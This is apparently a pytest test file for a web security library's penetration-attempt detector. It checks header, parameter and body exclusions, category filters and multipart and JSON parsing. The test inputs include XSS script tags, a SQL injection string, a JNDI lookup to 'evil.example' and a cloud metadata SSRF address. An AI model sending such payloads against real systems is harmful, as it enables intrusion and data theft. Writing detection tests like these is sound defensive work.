import json
from collections.abc import Generator
from typing import Any

import pytest

from guard_core.models import SecurityConfig
from guard_core.sync.decorators.base import RouteConfig
from guard_core.sync.handlers.suspatterns_handler import SusPatternsManager
from guard_core.sync.utils import detect_penetration_attempt


@pytest.fixture(autouse=True)
def _reset_suspatterns_singleton() -> Generator[None, None]:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config

    SusPatternsManager._instance = None
    SusPatternsManager._config = None

    yield

    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config


class _FakeRequest:
    def __init__(
        self,
        query_params: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        body_bytes: bytes = b"",
        url_path: str = "/",
        method: str = "GET",
        client_host: str = "127.0.0.1",
    ) -> None:
        self._query_params = query_params or {}
        self._headers = headers or {}
        # Real HTTP sets Content-Length for a fixed body; only chunked
        # transfer-encoding omits it. Mirror that so the fail-closed cap
        # check does not skip body threats in these detection tests.
        if body_bytes and "content-length" not in self._headers:
            self._headers["content-length"] = str(len(body_bytes))
        self._body_bytes = body_bytes
        self._url_path = url_path
        self._method = method
        self._client_host = client_host
        self.state: Any = type("S", (), {})()

    @property
    def url_path(self) -> str:
        return self._url_path

    @property
    def url_scheme(self) -> str:
        return "https"

    @property
    def url_full(self) -> str:
        return f"https://test{self._url_path}"

    def url_replace_scheme(self, scheme: str) -> str:
        return f"{scheme}://test{self._url_path}"

    @property
    def method(self) -> str:
        return self._method

    @property
    def client_host(self) -> str | None:
        return self._client_host

    @property
    def headers(self) -> dict[str, str]:
        return self._headers

    @property
    def query_params(self) -> dict[str, str]:
        return self._query_params

    @property
    def scope(self) -> dict[str, Any]:
        return {}

    def body(self) -> bytes:
        return self._body_bytes


def test_operator_excluded_header_is_not_scanned_in_any_category() -> None:
    config = SecurityConfig(excluded_detection_headers={"x-raw"})
    for value in (
        "<script>alert(1)</script>",
        "' UNION SELECT password FROM users--",
        "${jndi:ldap://evil.example/a}",
    ):
        request = _FakeRequest(headers={"x-raw": value})
        _result = detect_penetration_attempt(request, config)
        assert _result.is_threat is False


def test_excluded_header_address_value_suppresses_ssrf_only() -> None:
    config = SecurityConfig(excluded_detection_headers={"x-raw"})
    request = _FakeRequest(headers={"x-raw": "169.254.169.254"})
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is False


def test_excluded_param_suppresses_match() -> None:
    config = SecurityConfig(excluded_detection_params={"search"})
    request = _FakeRequest(query_params={"search": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is False


def test_excluded_body_field_suppresses_match() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    request = _FakeRequest(
        body_bytes=b'{"notes": "<script>alert(1)</script>"}',
        headers={"content-type": "application/json"},
    )
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is False


def test_disabled_category_suppresses_match() -> None:
    config = SecurityConfig(enabled_detection_categories={"sqli"})
    request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is False


def test_enabled_category_still_matches() -> None:
    config = SecurityConfig(enabled_detection_categories={"xss"})
    request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Query param 'q'" in trigger


def test_route_exclusion_adds_to_global_header_exclusions() -> None:
    config = SecurityConfig()
    route_config = RouteConfig()
    route_config.excluded_detection_headers = {"x-raw"}
    request = _FakeRequest(headers={"x-raw": "169.254.169.254"})
    _result = detect_penetration_attempt(request, config, route_config)
    detected = _result.is_threat
    assert detected is False


def test_route_params_override_global_params() -> None:
    config = SecurityConfig(excluded_detection_params={"global_only"})
    route_config = RouteConfig()
    route_config.excluded_detection_params = {"route_only"}
    request = _FakeRequest(query_params={"global_only": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config, route_config)
    detected = _result.is_threat
    assert detected is True


def test_scan_body_disabled_suppresses_body_match() -> None:
    config = SecurityConfig(detection_scan_body=False)
    request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is False


def test_scan_body_disabled_still_scans_query_params() -> None:
    config = SecurityConfig(detection_scan_body=False)
    request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_scan_body_enabled_by_default_scans_body() -> None:
    config = SecurityConfig()
    request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_route_scan_body_override_disables_body() -> None:
    config = SecurityConfig(detection_scan_body=True)
    route_config = RouteConfig()
    route_config.detection_scan_body = False
    request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
    _result = detect_penetration_attempt(request, config, route_config)
    assert _result.is_threat is False


def test_route_scan_body_override_enables_body() -> None:
    config = SecurityConfig(detection_scan_body=False)
    route_config = RouteConfig()
    route_config.detection_scan_body = True
    request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
    _result = detect_penetration_attempt(request, config, route_config)
    assert _result.is_threat is True


def test_scan_body_defaults_true_when_config_absent() -> None:
    request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
    _result = detect_penetration_attempt(request)
    assert _result.is_threat is True


_JSON = {"content-type": "application/json"}
_FORM = {"content-type": "application/x-www-form-urlencoded"}


def _multipart(boundary: str, *parts: str) -> tuple[bytes, dict[str, str]]:
    body = "".join(f"--{boundary}\r\n{p}\r\n" for p in parts) + f"--{boundary}--\r\n"
    return body.encode(), {"content-type": f"multipart/form-data; boundary={boundary}"}


def test_excluded_body_field_suppresses_nested_match() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"content"})
    body = json.dumps(
        {"messages": [{"role": "user", "content": "<script>alert(1)</script>"}]}
    ).encode()
    request = _FakeRequest(body_bytes=body, headers=_JSON)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is False


def test_nested_non_excluded_field_still_matches() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"content"})
    body = json.dumps({"outer": {"note": "<script>alert(1)</script>"}}).encode()
    request = _FakeRequest(body_bytes=body, headers=_JSON)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_top_level_json_array_recurses() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"safe"})
    body = json.dumps([{"note": "<script>alert(1)</script>"}]).encode()
    request = _FakeRequest(body_bytes=body, headers=_JSON)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_non_excluded_form_field_matches_decoded() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"other"})
    body = b"message=%3Cscript%3Ealert(1)%3C%2Fscript%3E&other=hi"
    request = _FakeRequest(body_bytes=body, headers=_FORM)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_excluded_form_field_suppresses_decoded_match() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"message"})
    body = b"message=%3Cscript%3Ealert(1)%3C%2Fscript%3E&other=hi"
    request = _FakeRequest(body_bytes=body, headers=_FORM)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is False


def test_multipart_file_part_excluded_suppressed() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"file"})
    body, headers = _multipart(
        "B0",
        'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n<script>alert(1)</script>",
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is False


def test_multipart_file_part_non_excluded_matches() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"unused"})
    body, headers = _multipart(
        "B0",
        'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n<script>alert(1)</script>",
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_multipart_text_part_excluded_suppressed() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"note"})
    body, headers = _multipart(
        "B0",
        'Content-Disposition: form-data; name="note"\r\n\r\n<script>alert(1)</script>',
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is False


def test_multipart_text_part_non_excluded_matches() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"other"})
    body, headers = _multipart(
        "B0",
        'Content-Disposition: form-data; name="note"\r\n\r\n<script>alert(1)</script>',
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_multipart_unparseable_body_falls_back_to_blob() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"unused"})
    request = _FakeRequest(
        body_bytes=b"<script>alert(1)</script>",
        headers={"content-type": "multipart/form-data; boundary=Z9"},
    )
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_multipart_part_without_name_is_scanned() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"unused"})
    body, headers = _multipart(
        "B0", "Content-Disposition: form-data\r\n\r\n<script>alert(1)</script>"
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_multipart_part_without_name_not_suppressed_by_fallback_label() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"file"})
    body, headers = _multipart(
        "B0", "Content-Disposition: form-data\r\n\r\n<script>alert(1)</script>"
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_multipart_scans_second_text_part_when_first_is_clean() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"unused"})
    body, headers = _multipart(
        "B0",
        'Content-Disposition: form-data; name="a"\r\n\r\nhello world',
        'Content-Disposition: form-data; name="b"\r\n\r\n<script>alert(1)</script>',
    )
    request = _FakeRequest(body_bytes=body, headers=headers)
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is True


def test_route_categories_override_global_categories() -> None:
    config = SecurityConfig(enabled_detection_categories={"xss", "sqli"})
    route_config = RouteConfig()
    route_config.enabled_detection_categories = {"sqli"}
    request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config, route_config)
    detected = _result.is_threat
    assert detected is False


def test_route_config_none_fields_inherit_from_config() -> None:
    config = SecurityConfig(excluded_detection_params={"inherit_me"})
    route_config = RouteConfig()
    request = _FakeRequest(query_params={"inherit_me": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request, config, route_config)
    detected = _result.is_threat
    assert detected is False


def test_no_config_preserves_legacy_behaviour() -> None:
    request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    assert detected is True


def test_route_body_fields_override_global() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    route_config = RouteConfig()
    route_config.excluded_detection_body_fields = {"comments"}
    request = _FakeRequest(body_bytes=b'{"notes": "<script>alert(1)</script>"}')
    _result = detect_penetration_attempt(request, config, route_config)
    detected = _result.is_threat
    assert detected is True


def test_url_path_uses_enabled_categories() -> None:
    config = SecurityConfig(enabled_detection_categories={"xss"})
    request = _FakeRequest(url_path="/.git/index")
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is False


def test_request_body_non_json_falls_back_to_full_scan() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    request = _FakeRequest(body_bytes=b"<script>alert(1)</script>")
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is True


def test_request_body_invalid_json_with_excluded_body_fields() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    request = _FakeRequest(body_bytes=b"not valid json <script>alert(1)</script>")
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is True


def test_request_body_declared_json_but_malformed_falls_back_to_full_scan() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    request = _FakeRequest(
        body_bytes=b"not valid json <script>alert(1)</script>",
        headers={"content-type": "application/json"},
    )
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is True


def test_request_body_declared_json_scalar_falls_back_to_full_scan() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    request = _FakeRequest(
        body_bytes=b'"<script>alert(1)</script>"',
        headers={"content-type": "application/json"},
    )
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is True


def test_request_body_decode_failure_returns_false() -> None:
    class BadBodyRequest(_FakeRequest):
        def body(self) -> bytes:
            raise RuntimeError("body read failed")

    request = BadBodyRequest(query_params={"q": "safe"})
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is False
    assert trigger == ""


def test_request_body_field_threat_returns_field_message() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"safe"})
    request = _FakeRequest(
        body_bytes=b'{"q": "<script>alert(1)</script>"}',
        headers={"content-type": "application/json"},
    )
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Request body field 'q'" in trigger


def test_url_path_threat_message() -> None:
    request = _FakeRequest(url_path="/.git/index")
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "URL path" in trigger


def test_header_threat_message() -> None:
    request = _FakeRequest(headers={"x-attack": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Header 'x-attack'" in trigger


def test_request_body_no_excluded_fields_still_scans_full_body() -> None:
    request = _FakeRequest(body_bytes=b"<script>alert(1)</script>")
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Request body" in trigger


def test_unknown_client_host_is_handled() -> None:
    request = _FakeRequest(client_host="")
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    assert detected is False


def test_body_loop_iterates_past_safe_field_to_detect_threat() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"placeholder"})
    body = b'{"safe": "harmless", "evil": "<script>alert(1)</script>"}'
    request = _FakeRequest(
        body_bytes=body, headers={"content-type": "application/json"}
    )
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Request body field 'evil'" in trigger


def test_excluded_body_field_with_other_threat_field_still_detects() -> None:
    config = SecurityConfig(excluded_detection_body_fields={"notes"})
    body = (
        b'{"notes": "<script>alert(1)</script>", "other": "<script>alert(2)</script>"}'
    )
    request = _FakeRequest(
        body_bytes=body, headers={"content-type": "application/json"}
    )
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "other" in trigger


def test_excluded_header_all_enabled_categories_excluded_skips_scan() -> None:
    config = SecurityConfig(enabled_detection_categories={"ssrf"})
    request = _FakeRequest(headers={"x-real-ip": "169.254.169.254"})
    _result = detect_penetration_attempt(request, config)
    detected = _result.is_threat
    assert detected is False


def test_operator_excluded_header_name_is_skipped_with_its_value() -> None:
    malicious_name = "${jndi:ldap://evil.example/a}"
    config = SecurityConfig(excluded_detection_headers={malicious_name})
    request = _FakeRequest(headers={malicious_name: "benign"})
    _result = detect_penetration_attempt(request, config)
    assert _result.is_threat is False


def test_sensitive_query_param_value_threat_is_logged_redacted() -> None:
    request = _FakeRequest(query_params={"password": "<script>alert(1)</script>"})
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    assert detected is True


def test_malicious_query_param_name_is_detected() -> None:
    request = _FakeRequest(query_params={"<script>alert(1)</script>": "harmless"})
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Query param name" in trigger


def test_malicious_header_name_is_detected() -> None:
    request = _FakeRequest(headers={"<script>alert(1)</script>": "harmless"})
    _result = detect_penetration_attempt(request)
    detected = _result.is_threat
    trigger = _result.trigger_info
    assert detected is True
    assert "Header name" in trigger
